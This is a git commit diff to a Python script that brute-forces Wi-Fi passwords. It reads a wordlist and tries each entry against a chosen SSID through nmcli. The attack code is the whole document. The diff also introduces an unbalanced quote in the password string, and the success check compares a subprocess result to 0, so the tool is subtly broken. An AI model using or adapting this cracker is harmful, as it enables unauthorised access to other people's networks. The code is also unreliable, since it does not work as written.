9d8804d4b12cea25e8e6a9f187149f003c1fafa2
Immanuel Alex <iammalex125@gmail.com>
2025-01-26 22:17:00 +0530

    removed unnecessary code

--- main.py
+++ main.py
@@ -17,11 +17,8 @@ print("___ Enter the SSID ___ \n")
 ssid_in = input("SSID:")
 ssid = f"\"{ssid_in}\""
 
-#print("Please enter your sudo password :")
-#os.system("sudo systemctl isolate multi-user.target")
-
 def pas():
-#	os.chdir('/home/alex/Documents/Hacking')
+
 	with open ("passwords.txt","r") as f :
 		for line in f:
 		    yield line.strip()
@@ -46,37 +43,25 @@ time.sleep(0.02)
 								
 pswd_lst = pas()
 
-count = 0
 for pswd in pswd_lst:
 
     if len(pswd) < 8:
         continue
     
-        
-#    if count == 10:
-#        os.system("sudo systemctl isolate graphical.target")
-    
-    count += 1
-    
     try:
-	    pswd = f"\"{pswd}\""
-
-	    #cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
+	    pswd = f"\"{pswd}"
 	    cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd]
 	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
 
 	    print("trying : " + pswd)
-	    
-	    #result = os.system(cmd)
 	    time.sleep(2)
 	    
 	    if (result == 0):
 	        print(f"Password Obtained {pswd}")
-	        #os.system("sudo systemctl isolate graphical.target")
 	        break
 	        
-	    else: 
+	    else:
 	        print(f"-- Incorrect password {pswd}")
 	        
     except Exception as e:
